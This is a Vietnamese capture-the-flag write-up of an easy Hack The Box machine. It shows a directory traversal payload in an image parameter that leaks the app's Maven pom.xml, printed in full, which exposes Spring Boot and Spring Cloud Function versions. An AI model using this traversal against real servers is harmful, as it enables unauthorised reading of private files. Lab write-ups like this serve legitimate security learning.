Đây là 1 bài machine trên htb có độ khó là easy  
Vào machine hầu hết các chức năng của web đều chưa xây dựng hết ngoại trừ chức năng upload *tại sao lại có chức năng upload trong 1 trang web cho thuê bộ nhớ đám mây nhỉ? có vẻ không hợp lý lắm :))*.Tiếp tục thì tôi dành ra khá nhiều thời gian để tìm tài liệu và thử upload vì nghĩ đó là lỗ hổng upload thế nên tôi đã quyết định lang thang trên forum để tìm một số gợi ý:  
-pom.xml : đó là một file cấu hình  
-và không nên tập trung vào phần upload :V bruh  
Đó là 1 số gợi ý tôi kiếm được ở phần đầu , phần sau thì tí nữa biết.  
+Tôi đã thử cho pom.xml vào argument(đối số) ?img=pom.xml nhưng nó không hoạt động nên tôi đã thử thêm lỗ hổng Directory traversal
```
?img=/../../../pom.xml
```
+Đoán xem, nó đã hoạt động
Trong đó có một số thông tin như:
+web viết bằng java
+framework là spring boot
+version java 11 và một số version của mấy cái khác
```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

